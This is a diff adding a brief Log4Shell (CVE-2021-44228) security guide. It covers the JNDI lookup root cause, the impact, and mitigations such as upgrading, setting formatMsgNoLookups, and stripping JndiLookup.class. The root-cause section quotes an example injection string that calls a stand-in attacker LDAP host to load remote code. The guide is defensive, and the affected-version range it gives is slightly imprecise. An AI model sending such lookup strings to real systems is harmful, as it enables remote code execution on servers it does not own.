@@ -1,0 +1,15 @@
+Apache Log4j Security Guide (CVE-2021-44228)
+
+Overview:
+CVE-2021-44228, colloquially known as Log4Shell, is a critical remote code execution vulnerability discovered in Apache Log4j versions 2.0-beta9 through 2.15.0. It carries a maximum CVSS score of 10.0.
+
+Root Cause:
+The vulnerability arises from Log4j's JNDI (Java Naming and Directory Interface) lookup feature. When logging untrusted user input containing string patterns like "${jndi:ldap://attacker.com/payload}", Log4j executes an outbound network request to the specified LDAP or RMI directory server and loads arbitrary Java bytecode.
+
+Impact:
+Unauthenticated remote attackers can execute arbitrary code with the permissions of the vulnerable Java process, leading to complete system compromise, data exfiltration, or deployment of ransomware.
+
+Recommended Mitigations:
+1. Primary Mitigation: Upgrade immediately to Apache Log4j version 2.17.1 or later for Java 8 users.
+2. Configuration Mitigation: For versions 2.10 to 2.14.1, set the system property "log4j2.formatMsgNoLookups=true" or the environment variable "LOG4J_FORMAT_MSG_NO_LOOKUPS=true".
+3. Class Removal: For versions where upgrades are impossible, remove the JndiLookup class from the classpath by deleting it from the log4j-core JAR: "zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class".
